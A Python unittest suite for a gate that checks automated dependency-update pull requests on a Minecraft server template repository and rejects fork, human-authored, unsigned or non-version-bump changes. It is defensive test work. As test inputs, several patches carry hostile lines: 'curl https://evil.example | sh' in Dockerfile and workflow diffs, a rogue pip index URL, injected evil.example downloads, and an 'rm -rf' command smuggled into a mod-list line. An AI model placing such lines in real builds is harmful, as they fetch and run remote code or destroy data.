#!/usr/bin/env python3
"""Tests for dep-review's gate: the public repository's boundary for automated dependency PRs.

Load-bearing: every rejection here is a way for a stranger's PR, or a PR that
changes more than a version, to reach the reviewer and then auto-merge. The
fixtures under fixtures/dep_review/ are trimmed real API responses (PR 17 pip,
25 docker, 26 mods, 27 actions).
"""
import copy
import json
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "dep_review"))
import common  # noqa: E402
import gate  # noqa: E402

FIXTURES = Path(__file__).resolve().parent / "fixtures" / "dep_review"
REPO = "piprees/minecraft-server-template"
POLICY = common.load_policy()


def load(n):
    pr, commits, files, comments = gate.load_dir(FIXTURES / f"pr{n}")
    pr["state"] = "open"
    return pr, commits, files, comments


def evaluate(pr, commits, files, comments, repo, policy, **kwargs):
    """gate.evaluate with the fixture's manifests, as the CLI loads them."""
    kwargs.setdefault("manifests", gate.load_dir_manifests(FIXTURES / f"pr{pr.get('number')}"))
    return gate.evaluate(pr, commits, files, comments, repo, policy, **kwargs)


def state_comment(fingerprint, cid=10, login="github-actions[bot]"):
    return {"id": cid, "user": {"login": login},
            "body": common.encode_state({"v": 1, "fingerprint": fingerprint, "verdicts": {}})}


class AcceptsRealShapes(unittest.TestCase):
    def check(self, n, source):
        pr, commits, files, comments = load(n)
        if n == 17:
            commits = [c for c in commits if c["author"]["login"] == "dependabot[bot]"]
        result = evaluate(pr, commits, files, comments, REPO, POLICY)
        self.assertTrue(result["ok"], result["reason"])
        self.assertEqual(result["source"], source)
        self.assertFalse(result["skip"])
        self.assertEqual(len(result["fingerprint"]), 64)
        return result

    def test_actions(self):
        r = self.check(27, "actions")
        self.assertFalse(r["needs_smoke"])
        self.assertEqual(r["dockerfiles"], [])

    def test_docker(self):
        r = self.check(25, "docker")
        self.assertEqual(r["dockerfiles"], ["docker/kuma-init/Dockerfile"])
        self.assertFalse(r["needs_smoke"])

    def test_pip(self):
        self.check(17, "pip")

    def test_mods(self):
        r = self.check(26, "mods")
        self.assertTrue(r["needs_smoke"])
        self.assertIn("scripts/data/structure-sets-extracted.json", r["worldgen_paths"])
        self.assertIn("mods/custom-dimensions/src/main/resources/structure_themes.json", r["worldgen_paths"])
        self.assertNotIn("config/modrinth-mods.txt", r["worldgen_paths"])

    def test_defaults_seed_dockerfile_needs_smoke(self):
        pr, commits, files, comments = load(25)
        files[0]["filename"] = "docker/defaults-seed/Dockerfile"
        self.assertTrue(evaluate(pr, commits, files, comments, REPO, POLICY)["needs_smoke"])


class Rejects(unittest.TestCase):
    def assertRejected(self, n, mutate, fragment):
        pr, commits, files, comments = load(n)
        mutate(pr, commits, files)
        result = evaluate(pr, commits, files, comments, REPO, POLICY)
        self.assertFalse(result["ok"])
        self.assertIn(fragment, result["reason"])
        self.assertFalse(result["skip"])

    def test_closed(self):
        self.assertRejected(27, lambda pr, c, f: pr.update(state="closed"), "not open")

    def test_draft(self):
        self.assertRejected(27, lambda pr, c, f: pr.update(draft=True), "draft")

    def test_fork_head(self):
        self.assertRejected(27, lambda pr, c, f: pr["head"].update(repo={"full_name": "evil/fork"}), "forks")

    def test_deleted_fork_head(self):
        self.assertRejected(27, lambda pr, c, f: pr["head"].update(repo=None), "forks")

    def test_wrong_base(self):
        self.assertRejected(27, lambda pr, c, f: pr["base"].update(ref="release"), "not main")

    def test_human_author(self):
        self.assertRejected(27, lambda pr, c, f: pr["user"].update(login="piprees"), "not a recognised")

    def test_bot_on_wrong_branch(self):
        self.assertRejected(26, lambda pr, c, f: pr["head"].update(ref="mod-updates/other"), "not a recognised")

    def test_dependabot_on_non_dependabot_branch(self):
        self.assertRejected(27, lambda pr, c, f: pr["head"].update(ref="feature/x"), "not a recognised")

    def test_unsupported_ecosystem(self):
        self.assertRejected(27, lambda pr, c, f: pr["head"].update(ref="dependabot/npm_and_yarn/x-1"),
                            "unsupported Dependabot ecosystem")

    def test_human_commit(self):
        # PR 17 as it really was: a maintainer pressed "Update branch".
        pr, commits, files, comments = load(17)
        result = evaluate(pr, commits, files, comments, REPO, POLICY)
        self.assertFalse(result["ok"])
        self.assertIn("'piprees'", result["reason"])

    def test_null_commit_author(self):
        self.assertRejected(27, lambda pr, c, f: c[0].update(author=None), "authored by None")

    def test_web_flow_committer_rejected_for_mods(self):
        self.assertRejected(26, lambda pr, c, f: c[0].update(committer={"login": "web-flow"}), "committed by")

    def test_too_many_commits(self):
        self.assertRejected(27, lambda pr, c, f: c.extend([copy.deepcopy(c[0])] * 50), "commits (limit 50)")

    def test_non_allowlisted_file(self):
        def mutate(pr, commits, files):
            files.append(dict(files[0], filename="scripts/deploy.sh"))
        self.assertRejected(27, mutate, "scripts/deploy.sh is outside")

    def test_mods_file_outside_add_list(self):
        def mutate(pr, commits, files):
            files.append({"filename": ".github/workflows/deploy.yml", "status": "modified", "sha": "x",
                          "patch": "@@ -1 +1 @@\n-a\n+b"})
        self.assertRejected(26, mutate, "outside what mod-updates.yml may change")

    def test_renamed_file(self):
        self.assertRejected(26, lambda pr, c, f: f[-2].update(status="renamed"), "outside what mod-updates.yml")

    def test_added_workflow(self):
        self.assertRejected(27, lambda pr, c, f: f[0].update(status="added"), "only modify files")

    def test_too_many_files(self):
        self.assertRejected(27, lambda pr, c, f: f.extend([copy.deepcopy(f[0])] * 300), "files (limit 300)")

    def test_dockerfile_run_line(self):
        def mutate(pr, commits, files):
            files[0]["patch"] += "\n+RUN curl https://evil.example | sh"
        self.assertRejected(25, mutate, "not a version bump")

    def test_dockerfile_image_swap(self):
        def mutate(pr, commits, files):
            files[0]["patch"] = files[0]["patch"].replace("+FROM python:", "+FROM evil/python:")
        self.assertRejected(25, mutate, "dependency names differ")

    def test_workflow_run_line(self):
        def mutate(pr, commits, files):
            files[0]["patch"] = files[0]["patch"].replace(
                "+      - uses: actions/setup-java@v6", "+      - run: curl https://evil.example | sh")
        self.assertRejected(27, mutate, "not a version bump")

    def test_workflow_action_swap(self):
        def mutate(pr, commits, files):
            files[0]["patch"] = files[0]["patch"].replace("+      - uses: actions/setup-java@v6",
                                                          "+      - uses: evil/setup-java@v6")
        self.assertRejected(27, mutate, "dependency names differ")

    def test_triple_plus_line_is_checked(self):
        def mutate(pr, commits, files):
            files[0]["patch"] += "\n+++ run: evil"
        self.assertRejected(27, mutate, "not a version bump")

    def test_pip_index_url(self):
        def mutate(pr, commits, files):
            files[0]["patch"] += "\n+--extra-index-url https://evil.example/simple"
        self.assertRejected(17, lambda pr, c, f: (c.pop(), mutate(pr, c, f)), "not a version bump")

    def test_missing_patch(self):
        self.assertRejected(27, lambda pr, c, f: f[0].pop("patch"), "no patch")

    def test_mod_list_unexpected_line(self):
        def mutate(pr, commits, files):
            mods = next(x for x in files if x["filename"] == "config/modrinth-mods.txt")
            mods["patch"] += "\n+https://evil.example/mod.jar"
        self.assertRejected(26, mutate, "unexpected line")

    def test_malformed_input_fails_closed(self):
        pr, commits, files, comments = load(27)
        files[0] = "not a dict"
        result = evaluate(pr, commits, files, comments, REPO, POLICY)
        self.assertFalse(result["ok"])


class Provenance(unittest.TestCase):
    """Commit logins are whatever a pusher writes; the signature is not."""

    def test_unsigned_dependabot_commit(self):
        pr, commits, files, comments = load(27)
        commits[0]["commit"]["verification"] = {"verified": False, "reason": "unsigned"}
        result = evaluate(pr, commits, files, comments, REPO, POLICY)
        self.assertFalse(result["ok"])
        self.assertIn("not signed by GitHub", result["reason"])

    def test_actions_bot_commit_on_dependabot_branch(self):
        pr, commits, files, comments = load(27)
        commits.append({"sha": "f" * 40, "author": {"login": "github-actions[bot]"},
                        "committer": {"login": "github-actions[bot]"}, "commit": {}})
        result = evaluate(pr, commits, files, comments, REPO, POLICY)
        self.assertFalse(result["ok"])
        self.assertIn("not an allowed bot", result["reason"])


class NextMajorBranch(unittest.TestCase):
    def test_next_major_branch_is_the_worldgen_source(self):
        pr, commits, files, comments = load(26)
        pr["head"]["ref"] = "mod-updates/next-major"
        result = evaluate(pr, commits, files, comments, REPO, POLICY)
        self.assertTrue(result["ok"], result["reason"])
        self.assertEqual(result["source"], "worldgen")
        self.assertTrue(result["needs_smoke"])

    def test_other_mod_branches_are_rejected(self):
        pr, commits, files, comments = load(26)
        pr["head"]["ref"] = "mod-updates/other"
        self.assertFalse(evaluate(pr, commits, files, comments, REPO, POLICY)["ok"])


class Manifest(unittest.TestCase):
    """The mod PR may re-pin manifest entries and edit holds, nothing else."""

    def setUp(self):
        self.base, self.head = gate.load_dir_manifests(FIXTURES / "pr26")

    def run_gate(self, head):
        pr, commits, files, comments = load(26)
        return evaluate(pr, commits, files, comments, REPO, POLICY, manifests=(self.base, head))

    def test_real_repin_passes(self):
        self.assertTrue(self.run_gate(self.head)["ok"])

    def test_hold_edits_pass(self):
        head = copy.deepcopy(self.head)
        head["_holds"]["sodium"] = "0.7 breaks iris (dep-review: PR #26)"
        head["_holds"].pop(next(iter(self.base["_holds"])))
        self.assertTrue(self.run_gate(head)["ok"])

    def test_injected_download_is_rejected(self):
        head = copy.deepcopy(self.head)
        head["files"] = [{"path": "mods/x.jar", "downloads": ["https://evil.example/x.jar"]}]
        result = self.run_gate(head)
        self.assertFalse(result["ok"])
        self.assertIn("more than version pins", result["reason"])

    def test_added_client_mod_is_rejected(self):
        head = copy.deepcopy(self.head)
        head["_clientMods"]["required"].append("evil-mod:AbCdEf12")
        self.assertFalse(self.run_gate(head)["ok"])

    def test_non_string_hold_is_rejected(self):
        head = copy.deepcopy(self.head)
        head["_holds"]["sodium"] = {"url": "https://evil.example"}
        result = self.run_gate(head)
        self.assertFalse(result["ok"])
        self.assertIn("_holds", result["reason"])

    def test_unreadable_manifest_is_rejected(self):
        pr, commits, files, comments = load(26)
        result = evaluate(pr, commits, files, comments, REPO, POLICY, manifests=(None, None))
        self.assertFalse(result["ok"])
        self.assertIn("could not be read", result["reason"])


class ModListLines(unittest.TestCase):
    def test_real_line_shapes(self):
        for line in ("+fabric-api:Mys3P7lK", "-attributefix:XwbErf6s?", "+dungeons+:m8RPwRlg",
                     "+guard-villagers-(fabricquilt):ea8J4gbH", "+sit!:wstK3UaY",
                     "+datapack:ati-structures-fabricforge:K7cpaKjN  # ATI structures, ruins, towers"):
            self.assertRegex(line, gate.MOD_LIST_LINE)

    def test_rejected_shapes(self):
        for line in ("+?fabric-api:Mys3P7lK", "+fabric-api:short", "+resourcepack:x:ABCDEFGH",
                     "+Fabric-API:Mys3P7lK", "+fabric-api:Mys3P7lK; rm -rf"):
            self.assertNotRegex(line, gate.MOD_LIST_LINE)


IMG = "    image: ${MIRROR_REGISTRY:-ghcr.io/piprees/mirrors}/"


def platform_pr(files=None, commits=None):
    """A platform-updates/auto PR built on fixture 26's shape (github-actions[bot], this repo)."""
    pr, mod_commits, _, comments = load(26)
    pr["head"]["ref"] = "platform-updates/auto"
    if files is None:
        files = [
            {"filename": "docker-compose.yml", "status": "modified",
             "patch": f"@@ -1 +1 @@\n-{IMG}nginx:1.30.3-alpine\n+{IMG}nginx:1.30.5-alpine\n"
                      "-      FABRIC_LOADER_VERSION: ${FABRIC_LOADER_VERSION:-0.19.3}\n"
                      "+      FABRIC_LOADER_VERSION: ${FABRIC_LOADER_VERSION:-0.19.5}"},
            {"filename": "mods/custom-dimensions/gradle.properties", "status": "modified",
             "patch": "@@ -4,2 +4,2 @@\n-loader_version=0.16.14\n+loader_version=0.19.5\n"
                      "-fabric_version=0.115.0+1.21.1\n+fabric_version=0.116.15+1.21.1"},
            {"filename": "mods/custom-dimensions/build-viewer-css.sh", "status": "modified",
             "patch": '@@ -38 +38 @@\n-TAILWIND_VERSION="4.3.3"\n+TAILWIND_VERSION="4.4.0"\n'
                      f'-    tailwindcss-linux-x64) echo "{"a" * 64}" ;;\n'
                      f'+    tailwindcss-linux-x64) echo "{"b" * 64}" ;;'},
            {"filename": "examples/consumer/.github/workflows/server-power.yml", "status": "modified",
             "patch": "@@ -1 +1 @@\n-          DOCTL_VERSION: '1.175.0'\n+          DOCTL_VERSION: '1.176.0'"},
        ]
    return pr, commits if commits is not None else mod_commits, files, comments


MANIFEST_BASE = {"dependencies": {"minecraft": "1.21.1", "fabric-loader": "0.19.3"}, "files": []}


class PlatformSource(unittest.TestCase):
    def run_gate(self, pr, commits, files, comments, manifests=(None, None)):
        return gate.evaluate(pr, commits, files, comments, REPO, POLICY, manifests=manifests)

    def test_accepted_and_smoked(self):
        r = self.run_gate(*platform_pr())
        self.assertTrue(r["ok"], r["reason"])
        self.assertEqual(r["source"], "platform")
        self.assertTrue(r["needs_smoke"])
        self.assertIn("mods/custom-dimensions/gradle.properties", r["worldgen_paths"])

    def test_manifest_loader_only(self):
        files = [{"filename": "modpack/adventure.mrpack.json", "status": "modified",
                  "patch": '@@ -1 +1 @@\n-    "fabric-loader": "0.19.3"\n+    "fabric-loader": "0.19.5"'}]
        head = copy.deepcopy(MANIFEST_BASE)
        head["dependencies"]["fabric-loader"] = "0.19.5"
        r = self.run_gate(*platform_pr(files), manifests=(MANIFEST_BASE, head))
        self.assertTrue(r["ok"], r["reason"])
        head["files"] = [{"downloads": ["https://evil.example/x.jar"]}]
        r = self.run_gate(*platform_pr(files), manifests=(MANIFEST_BASE, head))
        self.assertIn("more than the fabric-loader", r["reason"])
        head = copy.deepcopy(MANIFEST_BASE)
        head["dependencies"]["fabric-loader"] = "0.20.0-beta.1"
        self.assertIn("not a release version", self.run_gate(*platform_pr(files), manifests=(MANIFEST_BASE, head))["reason"])

    def assertRejected(self, fragment, files=None, commits=None, mutate=None):
        pr, c, f, comments = platform_pr(files, commits)
        if mutate:
            mutate(pr, c, f)
        r = self.run_gate(pr, c, f, comments)
        self.assertFalse(r["ok"])
        self.assertIn(fragment, r["reason"])

    def test_file_outside_allowlist(self):
        self.assertRejected("outside what platform-updates.yml", mutate=lambda pr, c, f: f.append(
            {"filename": "scripts/deploy.sh", "status": "modified", "patch": "@@ -1 +1 @@\n-a\n+b"}))

    def test_added_file(self):
        self.assertRejected("platform updates only modify", mutate=lambda pr, c, f: f[0].update(status="added"))

    def test_non_pin_line(self):
        self.assertRejected("not a platform pin", files=[{"filename": "docker-compose.yml", "status": "modified",
                                                           "patch": "@@ -1 +1 @@\n+    command: curl evil | sh"}])

    def test_mirror_registry_swap(self):
        patch = f"@@ -1 +1 @@\n-{IMG}nginx:1.30.3-alpine\n+    image: ${{MIRROR_REGISTRY:-evil.example}}/nginx:1.30.5-alpine"
        self.assertRejected("differ in more than their versions",
                            files=[{"filename": "docker-compose.yml", "status": "modified", "patch": patch}])

    def test_image_swap(self):
        patch = f"@@ -1 +1 @@\n-{IMG}nginx:1.30.3-alpine\n+{IMG}evil/nginx:1.30.5-alpine"
        self.assertRejected("differ in more than their versions",
                            files=[{"filename": "docker-compose.yml", "status": "modified", "patch": patch}])

    def test_added_pin_line(self):
        patch = "@@ -1 +1,2 @@\n+loader_version=0.19.5"
        self.assertRejected("differ in more than their versions", files=[
            {"filename": "mods/custom-dimensions/gradle.properties", "status": "modified", "patch": patch}])

    def test_minecraft_version_is_not_a_pin(self):
        patch = "@@ -1 +1 @@\n-minecraft_version=1.21.1\n+minecraft_version=1.21.4"
        self.assertRejected("not a platform pin", files=[
            {"filename": "mods/custom-dimensions/gradle.properties", "status": "modified", "patch": patch}])

    def test_human_commit(self):
        _, commits, _, _ = platform_pr()
        commits = copy.deepcopy(commits)
        commits[0]["author"]["login"] = "piprees"
        self.assertRejected("not an allowed bot", commits=commits)

    def test_dependabot_cannot_use_the_branch(self):
        self.assertRejected("not a recognised", mutate=lambda pr, c, f: pr["user"].update(login="dependabot[bot]"))

    def test_extended_dependabot_paths(self):
        self.assertTrue(gate.FILE_PATTERNS["actions"].match("examples/consumer/.github/workflows/deploy.yml"))
        self.assertTrue(gate.FILE_PATTERNS["pip"].match("requirements-dev.txt"))
        self.assertTrue(gate.FILE_PATTERNS["pip"].match("docker/kuma-init/requirements.txt"))
        self.assertFalse(gate.FILE_PATTERNS["pip"].match("docker/kuma-init/Dockerfile"))
        self.assertFalse(gate.FILE_PATTERNS["actions"].match("examples/other/.github/workflows/x.yml"))


class FingerprintAndState(unittest.TestCase):
    def test_stable_under_reordering(self):
        pr, commits, files, comments = load(26)
        a = gate.fingerprint(files)
        self.assertEqual(a, gate.fingerprint(list(reversed(files))))
        files[0]["sha"] = "0" * 40
        self.assertNotEqual(a, gate.fingerprint(files), "a patchless file contributes its blob sha")

    def test_hunk_offsets_do_not_matter(self):
        pr, commits, files, comments = load(27)
        a = gate.fingerprint(files)
        files[0]["patch"] = files[0]["patch"].replace("@@ -17,7 +17,7 @@", "@@ -30,7 +30,7 @@")
        self.assertEqual(a, gate.fingerprint(files))

    def test_skip_when_trusted_state_matches(self):
        pr, commits, files, _ = load(27)
        fp = gate.fingerprint(files)
        result = gate.evaluate(pr, commits, files, [state_comment("old", 5), state_comment(fp, 9)], REPO, POLICY)
        self.assertTrue(result["ok"])
        self.assertTrue(result["skip"])
        self.assertEqual(result["state_comment_id"], 9)
        self.assertEqual(result["previous_state"]["fingerprint"], fp)

    def test_no_skip_when_content_changed(self):
        pr, commits, files, _ = load(27)
        result = gate.evaluate(pr, commits, files, [state_comment("stale")], REPO, POLICY)
        self.assertTrue(result["ok"])
        self.assertFalse(result["skip"])
        self.assertEqual(result["state_comment_id"], 10)

    def test_force_never_skips_but_keeps_state(self):
        pr, commits, files, _ = load(27)
        fp = gate.fingerprint(files)
        result = gate.evaluate(pr, commits, files, [state_comment(fp)], REPO, POLICY, force=True)
        self.assertTrue(result["ok"])
        self.assertFalse(result["skip"])
        self.assertEqual(result["previous_state"]["fingerprint"], fp)
        self.assertEqual(result["state_comment_id"], 10)

    def test_untrusted_author_state_ignored(self):
        pr, commits, files, _ = load(27)
        forged = state_comment(gate.fingerprint(files), 99, login="piprees")
        result = gate.evaluate(pr, commits, files, [forged], REPO, POLICY)
        self.assertFalse(result["skip"])
        self.assertIsNone(result["state_comment_id"])
        self.assertIsNone(result["previous_state"])


class Output(unittest.TestCase):
    def test_github_output_lines(self):
        import tempfile
        pr, commits, files, comments = load(25)
        result = evaluate(pr, commits, files, comments, REPO, POLICY)
        with tempfile.NamedTemporaryFile("r", suffix=".txt") as tmp:
            gate.write_github_output(tmp.name, result)
            lines = dict(line.split("=", 1) for line in Path(tmp.name).read_text().splitlines())
        self.assertEqual(lines["ok"], "true")
        self.assertEqual(lines["skip"], "false")
        self.assertEqual(lines["source"], "docker")
        self.assertEqual(json.loads(lines["dockerfiles"]), ["docker/kuma-init/Dockerfile"])

    def test_concatenated_pages_decode(self):
        import subprocess
        original = subprocess.run

        class Done:
            stdout = '[{"a":1}][{"a":2}]\n'
        subprocess.run = lambda *a, **k: Done()
        self.addCleanup(setattr, subprocess, "run", original)
        self.assertEqual(gate._gh_json("x", paginate=True), [{"a": 1}, {"a": 2}])


if __name__ == "__main__":
    unittest.main()
